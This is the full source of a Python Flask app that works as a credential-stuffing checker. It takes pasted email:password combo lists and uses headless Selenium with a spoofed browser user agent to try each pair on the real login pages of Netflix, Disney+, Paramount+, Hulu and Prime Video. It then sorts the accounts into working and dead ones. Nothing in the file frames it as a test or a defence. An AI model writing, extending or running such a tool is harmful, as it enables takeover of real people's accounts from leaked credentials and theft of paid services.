from flask import Flask, render_template, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import os
import re
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

SERVICES = {
    "netflix": {
        "name": "Netflix",
        "url": "https://www.netflix.com/login",
        "email_selector": "input[name='userLoginId'], input[type='email'], input[autocomplete='email']",
        "pass_selector": "input[name='password'], input[type='password']",
        "submit_selector": "button[type='submit'], button[data-uia='login-submit-button']",
        "success_indicators": ["browse", "profiles", "who", "account"],
        "error_indicators": ["incorrect", "wrong password", "try again", "invalid"]
    },
    "disney": {
        "name": "Disney+",
        "url": "https://www.disneyplus.com/login",
        "email_selector": "input[type='email'], input[name='email'], input[aria-label*='email' i]",
        "pass_selector": "input[type='password'], input[name='password']",
        "submit_selector": "button[type='submit'], button:contains('Log in'), button:contains('Continue')",
        "success_indicators": ["home", "browse", "profiles", "watch"],
        "error_indicators": ["incorrect", "invalid", "try again", "error"]
    },
    "paramount": {
        "name": "Paramount+",
        "url": "https://www.paramountplus.com/account/signin/",
        "email_selector": "input[type='email'], input[name='email']",
        "pass_selector": "input[type='password'], input[name='password']",
        "submit_selector": "button[type='submit'], button.qt-continuebtn, button:contains('Sign In')",
        "success_indicators": ["home", "browse", "account", "watch"],
        "error_indicators": ["incorrect", "invalid", "error", "wrong"]
    },
    "hulu": {
        "name": "Hulu",
        "url": "https://auth.hulu.com/web/login",
        "email_selector": "input[type='email'], input[name='email'], input[id*='email']",
        "pass_selector": "input[type='password'], input[name='password']",
        "submit_selector": "button[type='submit'], button:contains('Log In')",
        "success_indicators": ["home", "browse", "profiles"],
        "error_indicators": ["incorrect", "invalid", "error", "wrong password"]
    },
    "prime": {
        "name": "Prime Video",
        "url": "https://www.amazon.com/ap/signin?openid.return_to=https%3A%2F%2Fwww.primevideo.com",
        "email_selector": "input[name='email'], input[type='email'], #ap_email",
        "pass_selector": "input[name='password'], input[type='password'], #ap_password",
        "submit_selector": "#signInSubmit, button[type='submit']",
        "success_indicators": ["primevideo", "watch", "home", "account"],
        "error_indicators": ["incorrect", "invalid", "error", "wrong"]
    }
}

def create_driver():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    options.binary_location = "/usr/bin/chromium"
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    driver.set_page_load_timeout(30)
    return driver

def check_credential(service_key, email, password):
    service = SERVICES.get(service_key)
    if not service:
        return {"email": email, "status": "error", "message": "servizio non supportato"}
    
    driver = None
    try:
        driver = create_driver()
        driver.get(service["url"])
        time.sleep(3)
        
        email_el = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, service["email_selector"]))
        )
        email_el.clear()
        email_el.send_keys(email)
        time.sleep(1)
        
        try:
            cont = driver.find_element(By.CSS_SELECTOR, "button[type='submit'], button:contains('Continue'), button:contains('Next')")
            if cont and cont.is_displayed():
                cont.click()
                time.sleep(2)
        except:
            pass
        
        pass_el = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, service["pass_selector"]))
        )
        pass_el.clear()
        pass_el.send_keys(password)
        time.sleep(1)
        
        try:
            submit = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, service["submit_selector"]))
            )
            submit.click()
        except:
            pass_el.send_keys("\n")
        
        time.sleep(5)
        
        current_url = driver.current_url.lower()
        page_source = driver.page_source.lower()
        
        success = any(ind in current_url or ind in page_source for ind in service["success_indicators"])
        error = any(ind in page_source for ind in service["error_indicators"])
        
        if success and not error:
            return {"email": email, "status": "working", "message": "login ok"}
        else:
            return {"email": email, "status": "dead", "message": "login fallito o captcha/block"}
            
    except Exception as e:
        return {"email": email, "status": "error", "message": str(e)[:80]}
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def extract_combo(line):
    line = line.strip()
    if not line:
        return None
    # Match email:password even if followed by | or other text
    m = re.search(r'([\w.+-]+@[\w.-]+\.[a-zA-Z]{2,})\s*[:;]\s*([^\s|]+)', line)
    if m:
        return m.group(1).strip(), m.group(2).strip()
    # Fallback simple split
    if ':' in line:
        parts = line.split(':', 1)
        email = parts[0].strip()
        password = parts[1].split('|')[0].strip() if '|' in parts[1] else parts[1].strip()
        if '@' in email and password:
            return email, password
    return None

@app.route("/")
def index():
    return render_template("index.html", services=SERVICES)

@app.route("/check", methods=["POST"])
def check():
    data = request.json
    service = data.get("service")
    raw = data.get("combos", "")
    lines = raw.strip().splitlines()
    
    results = {"working": [], "dead": [], "error": []}
    
    def process(line):
        combo = extract_combo(line)
        if not combo:
            return {"email": line[:40], "status": "error", "message": "formato non riconosciuto"}
        email, password = combo
        if not email or not password:
            return {"email": email or line[:40], "status": "error", "message": "vuoto"}
        return check_credential(service, email, password)
    
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [executor.submit(process, ln) for ln in lines if ln.strip()]
        for f in futures:
            res = f.result()
            results[res["status"]].append(res)
    
    return jsonify(results)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
